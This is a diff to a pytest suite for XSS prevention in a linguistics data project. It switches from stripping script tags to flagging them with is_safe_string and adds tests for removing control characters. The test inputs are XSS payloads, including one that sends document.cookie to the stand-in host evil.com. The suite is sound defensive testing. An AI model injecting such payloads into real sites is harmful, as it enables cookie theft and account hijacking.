@@ -19,9 +19,11 @@ from src.models.lsr import LSR
 class TestXSSPrevention:
     """Test prevention of Cross-Site Scripting (XSS) attacks.
 
-    Note: Full XSS prevention requires output encoding at render time.
-    The sanitize_string function removes script tags but other vectors
-    require HTML escaping when displaying user content.
+    Note: sanitize_string deliberately does NOT strip or escape HTML,
+    because linguistic data legitimately contains characters like '>'
+    (e.g. "k > tʃ"). XSS prevention happens in two places instead:
+    is_safe_string flags injection patterns, and HTML escaping is
+    applied at the presentation layer when content is rendered.
     """
 
     @pytest.mark.parametrize("malicious_input", [
@@ -30,12 +32,19 @@ class TestXSSPrevention:
         "<ScRiPt>alert('xss')</ScRiPt>",
         "<script>document.location='http://evil.com/'+document.cookie</script>",
     ])
-    def test_script_tags_removed(self, malicious_input):
-        """Test that script tags are removed by sanitize_string."""
-        result = sanitize_string(malicious_input)
+    def test_script_tags_flagged_unsafe(self, malicious_input):
+        """Test that script tag payloads are flagged by is_safe_string."""
+        assert is_safe_string(malicious_input) is False
 
-        # Script tags should be removed
-        assert "<script" not in result.lower()
+    @pytest.mark.parametrize("malicious_input", [
+        "<script>alert('xss')</script>",
+        "test\x00value\x1b[31m",
+    ])
+    def test_sanitize_string_removes_control_characters(self, malicious_input):
+        """Test that sanitize_string strips control characters but preserves text."""
+        result = sanitize_string(malicious_input)
+        assert "\x00" not in result
+        assert "\x1b" not in result
 
     @pytest.mark.parametrize("malicious_input", [
         "<img src=x onerror=alert('xss')>",
